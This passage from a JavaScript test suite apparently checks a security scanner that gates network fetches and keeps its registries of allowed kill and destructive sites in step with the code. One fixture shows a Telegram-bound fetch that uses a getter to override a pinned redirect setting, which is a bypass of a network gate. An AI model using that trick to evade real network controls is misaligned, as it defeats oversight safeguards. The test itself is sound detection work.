  it('a getter property overriding a pinned key at runtime → global-fetch-gate', () => {
    ok(rules(scan('notify.mjs', "fetch('https://api.telegram.org/bot0/sendMessage', { method: 'POST', redirect: 'error', signal: AbortSignal.timeout(5), get redirect() { return 'follow'; } });")).includes('global-fetch-gate'));
  });
});

// ---------------------------------------------------------------------------
// (c) Registry drift — registry never looser than the code
// ---------------------------------------------------------------------------

describe('ADR-0035 §4 guard — registry drift', () => {
  it('every CAPABILITY_IMPORTERS file exists and imports its declared module', async () => {
    for (const [file, spec] of Object.entries(registry.CAPABILITY_IMPORTERS)) {
      const src = await readFile(resolve(RUNTIME_SCRIPTS, file), 'utf-8');
      for (const mod of spec.modules) {
        ok(src.includes(`from '${mod}'`), `${file} should still import ${mod}`);
      }
    }
  });

  it('every ALLOWED_KILL_SITES / ALLOWED_DESTRUCTIVE_TEMPLATES file exists', async () => {
    const files = new Set([
      ...registry.ALLOWED_KILL_SITES.map((s) => s.file),
      ...registry.ALLOWED_DESTRUCTIVE_TEMPLATES.map((s) => s.file),
    ]);
    for (const file of files) {
      const src = await readFile(resolve(RUNTIME_SCRIPTS, file), 'utf-8');
      ok(src.length > 0, `${file} should exist`);
    }
  });
});
